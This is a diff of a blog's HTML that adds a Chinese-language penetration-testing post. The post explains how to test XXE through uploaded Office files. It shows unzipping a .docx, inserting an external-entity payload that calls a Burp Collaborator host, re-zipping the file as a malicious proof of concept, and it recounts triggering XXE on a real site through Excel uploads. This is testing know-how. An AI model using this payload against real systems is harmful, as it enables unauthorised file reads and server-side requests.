@@ -188,6 +188,87 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/18/%E9%80%9A%E8%BF%87-Office-Open-XML-%E8%A7%A3%E6%9E%90%E5%99%A8%E8%BF%9B%E8%A1%8CXXE%E6%94%BB%E5%87%BB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="sing">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="sing's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/03/18/%E9%80%9A%E8%BF%87-Office-Open-XML-%E8%A7%A3%E6%9E%90%E5%99%A8%E8%BF%9B%E8%A1%8CXXE%E6%94%BB%E5%87%BB/" class="post-title-link" itemprop="url">通过 Office Open XML 解析器进行XXE攻击</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-03-18 20:48:27 / Modified: 22:12:31" itemprop="dateCreated datePublished" datetime="2022-03-18T20:48:27+08:00">2022-03-18</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01-前言"></a>0x01-前言</h2><h3 id="XXE-via-Office-Open-XML-Parsers"><a href="#XXE-via-Office-Open-XML-Parsers" class="headerlink" title="XXE via Office Open XML Parsers"></a>XXE via Office Open XML Parsers</h3><p>（复制自 <a target="_blank" rel="noopener" href="https://labs.detectify.com/2021/09/30/10-types-web-vulnerabilities-often-missed/"><strong>here</strong></a>）<br>许多 Web 应用程序允许您上传 Microsoft Office 文档，然后后端会从中解析数据。例如，您可能有一个 Web 应用程序，允许您通过上传 XLSX 格式的电子表格来导入数据。在某些时候，为了让解析器从电子表格中提取数据，解析器需要<strong>parse at least one XML file</strong>.</p>
+<p>对此进行测试的唯一方法是生成一个包含 XXE 有效负载的 <strong>Microsoft Office 文件</strong>，所以让我们这样做。<br>首先，创建一个空目录来解压你的文档，然后解压！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">test$ ls</span><br><span class="line">test.docx</span><br><span class="line">test$ mkdir unzipped</span><br><span class="line">test$ unzip ./test.docx -d ./unzipped/</span><br><span class="line">Archive:  ./test.docx</span><br><span class="line">  inflating: ./unzipped/word/numbering.xml</span><br><span class="line">  inflating: ./unzipped/word/settings.xml</span><br><span class="line">  inflating: ./unzipped/word/fontTable.xml</span><br><span class="line">  inflating: ./unzipped/word/styles.xml</span><br><span class="line">  inflating: ./unzipped/word/document.xml</span><br><span class="line">  inflating: ./unzipped/word/_rels/document.xml.rels</span><br><span class="line">  inflating: ./unzipped/_rels/.rels</span><br><span class="line">  inflating: ./unzipped/word/theme/theme1.xml</span><br><span class="line">  inflating: ./unzipped/[Content_Types].xml</span><br></pre></td></tr></table></figure>
+
+<p>在您喜欢的文本编辑器 (vim) 中打开 <code>./unzipped/word/document.xml</code> 并编辑 <strong>XML 以包含您喜欢的 XXE 有效负载</strong>。我尝试的第一件事往往是 HTTP 请求，如下所示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE x [ &lt;!ENTITY test SYSTEM &quot;http://[ID].burpcollaborator.net/&quot;&gt; ]&gt;</span><br><span class="line">&lt;x&gt;&amp;test;&lt;/x&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这些行应该像这样插入到两个根 XML 对象之间，当然您需要将 URL 替换为可以监视请求的 URL：</p>
+<p><img src="https://labs.detectify.com/wp-content/uploads/2021/09/xxe-obscure.png" alt="Those lines should be inserted in between the two root XML objects, like thi"></p>
+<p>剩下的就是<strong>压缩文件以创建恶意的 poc.docx 文件</strong>。从我们之前创建的“解压缩”目录中，运行以下命令：</p>
+<p><img src="https://labs.detectify.com/wp-content/uploads/2021/09/xxe-unzipped.png" alt="From the &quot;unzipped&quot; directory that we created earlier, run the following:"></p>
+<p>现在将文件上传到易受攻击的 Web 应用程序，并在 Burp Collaborator 日志监控是否收到请求。</p>
+<h2 id="0x02-通过上传Excel对网站进行XXE攻击"><a href="#0x02-通过上传Excel对网站进行XXE攻击" class="headerlink" title="0x02-通过上传Excel对网站进行XXE攻击"></a>0x02-通过上传Excel对网站进行XXE攻击</h2><h3 id="0x02-1-确认XXE"><a href="#0x02-1-确认XXE" class="headerlink" title="0x02-1 确认XXE"></a>0x02-1 确认XXE</h3><p>某次对项目网站进行测试，发现应用系统中提供多个上传接口，允许用户上传 Excel 文件并在后端对 Excel 文件进行数据解析导入。<br>根据 <code>0x01-前言</code> 提及的方法，对 Excel 解压，修改文件XML内容。第一次修改的文件为 <code>[Content_Types].xml</code> ，修改后重压缩文件为 xsls 文件并上传，测试后现XXE攻击失败。<br>后续将 <code>xl/workbook.xml</code>、<code>xl/worksheets/sheet1.xml</code>、<code>xl/theme/theme1.xml</code>的内容均作修改，插入 XXE PayLoad。重新上传修改后的 xsls 文件，成功触发 XXE漏洞。</p>
+<h3 id="0x02-2-读取文件"><a href="#0x02-2-读取文件" class="headerlink" title="0x02-2 读取文件"></a>0x02-2 读取文件</h3><p>还没来得及测试，对方已修复漏洞，bingo！！！</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/18/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E4%B9%8B%E5%89%8D%E7%AB%AFAES%E5%8A%A0%E5%AF%86/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -502,7 +583,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
           <a href="/archives">
-          <span class="site-state-item-count">23</span>
+          <span class="site-state-item-count">24</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -513,7 +594,7 @@
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
-        <span class="site-state-item-count">35</span>
+        <span class="site-state-item-count">37</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
